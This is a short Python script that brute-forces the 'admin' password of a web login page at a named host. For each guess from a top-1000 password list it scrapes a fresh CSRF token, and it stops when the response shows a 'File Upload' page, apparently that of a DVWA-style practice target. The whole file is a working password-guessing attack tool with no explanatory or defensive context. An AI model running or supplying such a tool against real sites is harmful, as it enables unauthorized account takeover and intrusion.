#coding:utf-8
import requests
import re

url = "http://www.c3moon.com/login.php"

def login(password):
    session = requests.session()
    req=session.get(url)
    user_token=re.search("[a-z0-9]{32}",req.text).group(0) #32md5
    data={"username":"admin","password":password,"Login":"Login",'user_token':user_token}
    req=session.post(url=url,data=data,allow_redirects=True)
    html = req.text
    return html

with open('top1000.txt') as p:
    passlist =p.readlines()
    p.close()

for line in passlist:
    line = line.strip("\n")
    print(line)
    if 'File Upload' in login(line):
        print( "[* 密码 is %s *]" % line )
        break







